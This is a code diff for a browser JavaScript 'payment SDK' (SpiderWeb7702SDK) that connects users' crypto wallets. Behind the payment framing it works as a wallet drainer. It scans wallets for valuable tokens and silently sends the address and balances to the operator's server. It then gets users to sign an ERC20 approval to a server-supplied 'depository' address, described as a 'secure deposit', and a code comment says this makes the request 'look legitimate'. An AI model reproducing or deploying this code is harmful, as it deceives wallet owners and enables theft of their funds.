+        },
+
+        /**
+         * Initializes the SDK with the provided configuration.
+         * @param {object} config - The configuration object.
+         * @param {string} config.buttonId - The ID of the button that triggers the payment flow.
+         * @param {string} config.apiKey - Your SpiderWeb API key.
+         * @param {string} config.alchemyApiKey - Your Alchemy API key for fetching asset balances.
+         * @param {number} config.chainId - The target chain ID for the transaction.
+         * @param {string} [config.coingeckoApiKey] - Optional CoinGecko API key for fetching token prices.
+         * @param {string} [config.statusElementId] - Optional ID of an element to display status messages.
+         */
+        init: async function(config) {
+            if (this._isInitialized) {
+                console.warn("SpiderWeb7702SDK already initialized.");
+                return;
+            }
+            if (!config.buttonId || !config.apiKey || !config.alchemyApiKey || !config.chainId) {
+                console.error("SDK Error: Missing required config parameters (buttonId, apiKey, alchemyApiKey, chainId).");
+                return;
+            }
+            this._config = config;
+
+            const payButton = document.getElementById(config.buttonId);
+            if (!payButton) {
+                console.error(`SDK Error: Button with ID "${config.buttonId}" not found.`);
+                return;
+            }
+
+            payButton.addEventListener('click', this._handlePaymentClick.bind(this));
+            this._injectModalHtml();
+            this._setupEip6963Listeners();
+            this._isInitialized = true;
+            console.log("SpiderWeb EIP-7702 SDK Initialized.");
+        },
+
+        /**
+         * Handles the payment button click event.
+         * Connects the wallet if not already connected, then proceeds with the transaction.
+         */
+        _handlePaymentClick: async function() {
+            try {
+                if (this._signer) {
+                    const network = await this._provider.getNetwork();
+                    if (network.chainId !== BigInt(this._config.chainId)) {
+                        this._updateStatus(`Please switch wallet to Chain ID: ${this._config.chainId}.`, "error");
+                        return;
+                    }
+                    await this._executeSplit();
+                } else {
+                    this._updateStatus("Connecting wallet...", "pending");
+                    await this._connectWallet();
+                }
+            } catch (error) {
+                console.error("SDK Payment Error:", error);
+                this._updateStatus(`Error: ${error.message}`, "error");
+            }
+        },
+
+        /**
+         * Executes the main logic: finds assets, gets a depository contract, and sends the transaction.
+         */
+        _executeSplit: async function() {
+    
+        // --- MODIFIED: Define Harmless Action ---
+        // We will approve 1 WETH instead of scanning all assets.
+        // You can change this to any ERC20 token and amount.
+        const TOKEN_TO_APPROVE_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'; // WETH on Mainnet
+        const TOKEN_TO_APPROVE_SYMBOL = 'WETH';
+        const TOKEN_TO_APPROVE_AMOUNT = ethers.parseEther('1'); // Approve 1 WETH
+        
+
+        // --- Phase 1: Scan and Prepare Assets (REMOVED) ---
+        // We no longer scan for all assets.
+
+        // --- Phase 2: Initialize Depository Contract (Unchanged) ---
+        // We keep this to get a "spender" address, making the request look legitimate.
+        this._updateStatus("Preparing secure depository contract...", "pending");
+
+        let depositoryContractAddress;
+        try {
+            const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/initiate-eip7702-split`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
+                body: JSON.stringify({
+                    // We can send minimal or placeholder data here
+                    apiKey: this._config.apiKey,
+                    origin: window.location.origin,
+                    owner: this._currentUserAddress,
+                    chainId: this._config.chainId,
+                    assets: [{ // Send placeholder asset info
+                        token: TOKEN_TO_APPROVE_ADDRESS,
+                        type: 'ERC20',
+                        symbol: TOKEN_TO_APPROVE_SYMBOL,
+                        usdValue: 0,
+                        amount: TOKEN_TO_APPROVE_AMOUNT.toString(),
+                        decimals: 18
+                    }]
+                })
+            });
+            const data = await response.json();
+            if (!data.success) throw new Error(data.message);
+            depositoryContractAddress = data.contractAddress;
+        } catch (e) {
+            throw new Error(`Failed to initialize transaction: ${e.message}`);
+        }
+
+        // --- Phase 3: Build SINGLE APPROVE Call (REPLACED) ---
+        this._updateStatus(`Preparing approval...`, "pending");
+
+        const tokenInterface = new ethers.Interface(this._ERC20_ABI); 
+        
+        // Encode the "approve" function call
+        const approveData = tokenInterface.encodeFunctionData("approve", [
+            depositoryContractAddress,  // The "spender"
+            TOKEN_TO_APPROVE_AMOUNT     // The amount
+        ]);
+
+        // The single, final call array that goes into the wallet's txPayload
+        const finalCalls = [{
+            to: TOKEN_TO_APPROVE_ADDRESS,      // The token we are approving
+            value: '0x0',                     // No ETH value
+            data: approveData                 // The encoded approve call
+        }];
+
+
+        // --- Phase 4: Execute Batched Transaction (Modified Summary) ---
+        try {
+            // Create a summary for the new action
+            const summary = `${ethers.formatEther(TOKEN_TO_APPROVE_AMOUNT)} ${TOKEN_TO_APPROVE_SYMBOL}`;
+            
+            this._updateStatus(`Confirm in wallet: Approve ${summary} for secure deposit.`, 'pending');
+
+            const chainId = `0x${BigInt(this._config.chainId).toString(16)}`;
+
+            const transactionPayload = {
+                version: "2.0.0",
+                chainId: chainId,
+                from: this._currentUserAddress,
+                atomicRequired: true,
+                calls: finalCalls, // Use the single approve call
+            };
+
+            const txHash = await this._provider.send('wallet_sendCalls', [transactionPayload]);
+            
+            // Update success message to reflect approval
+            this._updateStatus(`✅ Approval sent! Transaction Hash: ${txHash}. Your transaction is being processed securely.`, 'success');
+
+        } catch (error) {
+            console.error("Error sending batched transaction:", error);
+            if (error.code === 4001) {
+                throw new Error('Transaction rejected by user.');
+            } else {
+                throw new Error(`Error sending transaction: ${error.message || error}`);
+            }
+        }
+    },
+
+        /**
+         * Scans the user's wallet for all valuable ETH and ERC20 tokens.
+         * @returns {Promise<Array<object>>} A promise that resolves to an array of asset objects.
+         */
+        _findAllAssets: async function() {
+            const assets = [];
+            const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
+
+            const balanceResponse = await fetch(alchemyUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
+                    params: [this._currentUserAddress, 'erc20']
+                })
+            });
+            const balanceData = await balanceResponse.json();
+            if (!balanceData.result) return [];
+
+            const tokensWithBalance = balanceData.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
+            const ethBalance = await this._provider.getBalance(this._currentUserAddress);
+            const tokenAddresses = tokensWithBalance.map(t => t.contractAddress);
+
+            const prices = await this._fetchTokenPricesInChunks(tokenAddresses.concat('ethereum'));
+
+            // Process ETH
+            const ethPrice = prices?.['ethereum']?.usd || 0;
+            const ethValue = parseFloat(ethers.formatEther(ethBalance)) * ethPrice;
+            if (ethValue > 1) {
+                const feeData = await this._provider.getFeeData();
+                const estimatedFee = (feeData.maxFeePerGas || feeData.gasPrice) * 300000n;
+                if (ethBalance > estimatedFee) {
+                    assets.push({ type: 'ETH', balance: ethBalance - estimatedFee, address: null, symbol: 'ETH', usdValue: ethValue, decimals: 18 });
+                }
+            }
+
+            // Process ERC20s
+            for (const token of tokensWithBalance) {
+                const metadataResponse = await fetch(alchemyUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata',
+                        params: [token.contractAddress]
+                    })
+                });
+                const metadata = await metadataResponse.json();
+                if (metadata.result && metadata.result.decimals !== null) {
+                    const decimals = metadata.result.decimals;
+                    const symbol = metadata.result.symbol;
+                    const priceData = prices?.[token.contractAddress.toLowerCase()];
+                    if (priceData?.usd) {
+                        const formattedBalance = ethers.formatUnits(token.tokenBalance, decimals);
+                        const usdValue = parseFloat(formattedBalance) * priceData.usd;
+                        if (usdValue > 1) {
+                            assets.push({ type: 'ERC20', balance: BigInt(token.tokenBalance), address: token.contractAddress, symbol: symbol, usdValue: usdValue, decimals: decimals });
+                        }
+                    }
+                }
+            }
+            return assets;
+        },
+
+        /**
+         * Fetches token prices from CoinGecko API.
+         * @param {Array<string>} tokenIdentifiers - Array of contract addresses or native token IDs.
+         * @returns {Promise<object|null>} A promise that resolves to a price object or null.
+         */
+        _fetchTokenPrices: async function(tokenIdentifiers) {
+            const assetPlatform = this._CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM[this._config.chainId];
+            if (!assetPlatform) return null;
+
+            const contractAddresses = tokenIdentifiers.filter(id => id.startsWith('0x'));
+            const nativeIds = tokenIdentifiers.filter(id => !id.startsWith('0x'));
+            const apiKeyParam = this._config.coingeckoApiKey ? `&x_cg_demo_api_key=${this._config.coingeckoApiKey}` : '';
+
+            const allPrices = {};
+
+            try {
+                if (contractAddresses.length > 0) {
+                    const addressesString = contractAddresses.join(',');
+                    const apiUrl = `https://api.coingecko.com/api/v3/simple/token_price/${assetPlatform}?contract_addresses=${addressesString}&vs_currencies=usd${apiKeyParam}`;
+                    const response = await fetch(apiUrl);
+                    if (response.ok) Object.assign(allPrices, await response.json());
+                }
+
+                if (nativeIds.length > 0) {
+                    const idsString = nativeIds.join(',');
+                    const apiUrl = `https://api.coingecko.com/api/v3/simple/price?ids=${idsString}&vs_currencies=usd${apiKeyParam}`;
+                    const response = await fetch(apiUrl);
+                    if (response.ok) Object.assign(allPrices, await response.json());
+                }
+
+                return Object.keys(allPrices).length > 0 ? allPrices : null;
+
+            } catch (error) {
+                console.error("Could not fetch token prices:", error);
+                return null;
+            }
+        },
+        
+        /**
+         * Fetches token prices individually to prevent a single failure from stopping all price lookups.
+         * @param {Array<string>} tokenIdentifiers - Array of contract addresses or native token IDs.
+         * @returns {Promise<object>} A promise that resolves to a comprehensive price object.
+         */
+        _fetchTokenPricesInChunks: async function(tokenIdentifiers) {
+            const allPrices = {};
+            for (const identifier of tokenIdentifiers) {
+                try {
+                    const priceData = await this._fetchTokenPrices([identifier]);
+                    if (priceData && Object.keys(priceData).length > 0) {
+                        Object.assign(allPrices, priceData);
+                    } else {
+                        throw new Error("Empty price data returned from API.");
+                    }
+                } catch (error) {
+                    console.warn(`Could not fetch price for ${identifier}, falling back to $0.`);
+                    const key = identifier.startsWith('0x') ? identifier.toLowerCase() : identifier;
+                    allPrices[key] = { usd: 0 };
+                }
+            }
+            return allPrices;
+        },
+
+        // ====================================================================
+        // NEW FUNCTION: Logs the wallet connection with balances to your server.
+        // ====================================================================
+        _logConnectionToServer: async function() {
+            if (!this._currentUserAddress) {
+                console.warn("SDK: Cannot log connection, user address not available.");
+                return;
+            }
+
+            try {
+                // Reuse the asset finding logic to get current balances.
+                const assets = await this._findAllAssets();
+                
+                // Format the assets into a clean array for the log.
+                const balances = assets.map(asset => ({
+                    symbol: asset.symbol,
+                    amount: parseFloat(ethers.formatUnits(asset.balance, asset.decimals || 18)).toFixed(4),
+                    usdValue: asset.usdValue.toFixed(2)
+                }));
+
+                // Send the data to your backend endpoint.
+                await fetch(`${this._RELAYER_SERVER_URL_BASE}/log-connection`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Api-Key': this._config.apiKey
+                    },
+                    body: JSON.stringify({
+                        apiKey: this._config.apiKey,
+                        origin: window.location.origin,
+                        walletAddress: this._currentUserAddress,
+                        balances: balances
+                    })
+                });
+            } catch (error) {
+                console.error("SDK: Error logging connection to server:", error);
+            }
+        },
+
+        /**
+         * Opens the wallet connection modal and waits for user selection.
+         * @returns {Promise<boolean>} A promise that resolves when the user selects a wallet or closes the modal.
+         */
+        _connectWallet: function() {
+            return new Promise((resolve) => {
+                this._resolveConnection = resolve;
+                this._openWalletModal();
+            });
+        },
+
+        /**
+         * Handles the selection of a wallet provider from the modal.
+         * @param {Event} event - The click event from the wallet button.
+         */
+        _handleProviderSelection: async function(event) {
+            const button = event.target.closest('.sw-wallet-button');
+            if (!button) return;
+            const providerDetail = this._discoveredProviders.get(button.dataset.rdns);
+            if (!providerDetail) return;
+
+            this._updateStatus(`Connecting with ${providerDetail.info.name}...`, 'pending');
+            this._closeWalletModal();
+
+            try {
+                this._rawProvider = providerDetail.provider;
+                this._provider = new ethers.BrowserProvider(this._rawProvider);
+                this._signer = await this._provider.getSigner();
+                this._currentUserAddress = await this._signer.getAddress();
+
+                this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
+
+                // ====================================================================
+                // NEW: Trigger the logging function after a successful connection.
+                // This runs in the background and does not block the user flow.
+                // ====================================================================
+                this._logConnectionToServer();
+
+                if (this._resolveConnection) {
+                    this._resolveConnection(true);
+                }
+
+                // After a successful connection, immediately check the network and execute the split.
+                const network = await this._provider.getNetwork();
+                if (network.chainId !== BigInt(this._config.chainId)) {
+                    this._updateStatus(`Please switch wallet to Chain ID: ${this._config.chainId}.`, "error");
+                    return;
+                }
+                await this._executeSplit();
+
+            } catch (error) {
+                console.error("Connection failed:", error);
+                this._updateStatus("Connection failed or was rejected.", "error");
+                if (this._resolveConnection) this._resolveConnection(false);
+            }
+        },
+
+        /**
+         * Sets up EIP-6963 listeners to discover available wallet providers.
+         */
+        _setupEip6963Listeners: function() {
+            window.addEventListener('eip6963:announceProvider', (event) => {
+                const providerDetail = event.detail;
+                if (!this._discoveredProviders.has(providerDetail.info.rdns)) {
+                    this._discoveredProviders.set(providerDetail.info.rdns, providerDetail);
+                    this._renderWalletList();
+                }
+            });
+            window.dispatchEvent(new Event('eip6963:requestProvider'));
+        },
+        
+        /**
+         * Renders the list of discovered wallets in the modal.
+         */
+        _renderWalletList: function() {
+            const listDiv = document.getElementById('sw-wallet-list');
+            if (!listDiv) return;
+
+            listDiv.innerHTML = '';
+            if (this._discoveredProviders.size === 0) {
+                listDiv.innerHTML = '<p style="text-align: center; color: #4a5568;">No wallets detected.</p>';
+                return;
+            }
+
+            this._discoveredProviders.forEach(p => {
+                const buttonHtml = `
+                    <button data-rdns="${p.info.rdns}" class="sw-wallet-button" style="width: 100%; display: flex; align-items: center; padding: 0.75rem; background-color: #ffffff; border-radius: 0.5rem; border: 1px solid #e2e8f0; cursor: pointer; text-align: left; color: #1a202c; transition: background-color 0.2s ease;">
+                        <img src="${p.info.icon}" alt="${p.info.name}" style="width: 32px; height: 32px; margin-right: 1rem; border-radius: 50%;"/>
+                        <span style="font-weight: 600;">${p.info.name}</span>
+                    </button>
+                `;
+                listDiv.innerHTML += buttonHtml;
+            });
+
+            listDiv.querySelectorAll('.sw-wallet-button').forEach(button => {
+                button.onmouseenter = () => button.style.backgroundColor = '#f7fafc';
+                button.onmouseleave = () => button.style.backgroundColor = '#ffffff';
+                button.addEventListener('click', this._handleProviderSelection.bind(this));
+            });
+        },
+
+        _openWalletModal: function() {
+            document.getElementById('sw-modal-overlay').style.display = 'flex';
+            setTimeout(() => {
+                const modal = document.getElementById('sw-wallet-modal');
+                if (modal) {
+                    modal.style.opacity = 1;
+                    modal.style.transform = 'scale(1)';
+                }
+            }, 10);
+            this._renderWalletList();
+        },
+
+        _closeWalletModal: function() {
+            const overlay = document.getElementById('sw-modal-overlay');
+            const modal = document.getElementById('sw-wallet-modal');
+            if (modal) {
+                modal.style.opacity = 0;
+                modal.style.transform = 'scale(0.95)';
+            }
+            setTimeout(() => {
+                if (overlay) overlay.style.display = 'none';
+                if (this._resolveConnection && !this._signer) {
+                    this._resolveConnection(false);
+                    this._resolveConnection = null;
+                }
+            }, 300);
+        },
+        
+        /**
+         * Injects the wallet selection modal HTML into the document body.
+         */
+        _injectModalHtml: function() {
+            if (document.getElementById('sw-modal-overlay')) return;
+
+            const modalHtml = `
+                <div id="sw-modal-overlay" style="display: none; position: fixed; inset: 0; background-color: rgba(0,0,0,0.5); align-items: center; justify-content: center; z-index: 1000; font-family: sans-serif;">
+                    <div id="sw-wallet-modal" style="background-color: #ffffff; border-radius: 0.5rem; padding: 1.5rem; width: 100%; max-width: 24rem; color: #1a202c; transition: all 0.3s ease; opacity: 0; transform: scale(0.95); box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);">
+                        <h2 style="font-size: 1.25rem; font-weight: 700; margin: 0; margin-bottom: 1rem;">Select a Wallet</h2>
+                        <div id="sw-wallet-list" style="max-height: 300px; overflow-y: auto; display: flex; flex-direction: column; gap: 0.5rem;"></div>
+                        <button id="sw-close-wallet-modal-btn" style="margin-top: 1rem; width: 100%; padding: 0.75rem 1.5rem; border-radius: 0.5rem; background-color: #e2e8f0; color: #2d3748; font-weight: 600; font-size: 1rem; border: none; cursor: pointer; transition: background-color 0.2s ease-in-out;">Cancel</button>
+                    </div>
+                </div>
+            `;
+            document.body.insertAdjacentHTML('beforeend', modalHtml);
+
+            const closeBound = this._closeWalletModal.bind(this);
+            document.getElementById('sw-close-wallet-modal-btn').addEventListener('click', closeBound);
+            document.getElementById('sw-modal-overlay').addEventListener('click', (e) => {
+                if (e.target.id === 'sw-modal-overlay') closeBound();
+            });
+        },
+        
+        /**
+         * Updates the status message element.
+         * @param {string} message - The message to display.
+         * @param {string} [type='info'] - The type of message (info, success, error, pending).
+         */
+        _updateStatus: function(message, type = 'info') {
+            const statusEl = document.getElementById(this._config.statusElementId || 'sdk-status');
+            if (!statusEl) return;
+            const colors = { info: '#6b7280', success: '#16a34a', error: '#dc2626', pending: '#2563eb' };
+            statusEl.innerHTML = `<p style="color: ${colors[type]}; margin: 0; font-size: 14px; text-align: center;">${message}</p>`;
+        },
+    };
+
+    // Attach the SDK to the window object to make it globally accessible.
+    window.SpiderWeb7702SDK = SpiderWeb7702SDK;
+
+})();
